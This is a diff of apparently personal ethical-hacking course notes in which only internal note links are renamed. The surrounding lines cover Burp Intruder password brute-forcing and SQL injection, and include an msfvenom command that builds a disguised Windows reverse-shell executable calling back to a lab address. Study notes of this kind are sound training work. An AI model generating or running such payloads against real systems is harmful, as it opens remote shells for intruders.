@@ -289,7 +289,7 @@ Set [[cheet#FoxyProxy]]
 	- Add all the possible passwords
 	- Click Start "Attack"
 	- Look for difference inside Status Code and Length
-	Example with images -->  [[Notes/TCM/Capstones/Butler/report#BurpSuite]]
+	Example with images -->  [[Notes/TCM/ETH/Capstones/Butler/report#BurpSuite]]
 
 ### SQL Injection
 #### Initial things to do
@@ -341,7 +341,7 @@ What can we do now:
 ----
 ### Metasploit
 #### Use a module
-[[Notes/TCM/Capstones/Blue/report#Steps automated exploit|Use a module]]
+[[Notes/TCM/ETH/Capstones/Blue/report#Steps automated exploit|Use a module]]
 
 #### Create and rename a shell
 `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=7777 -f exe -o Wise.exe`
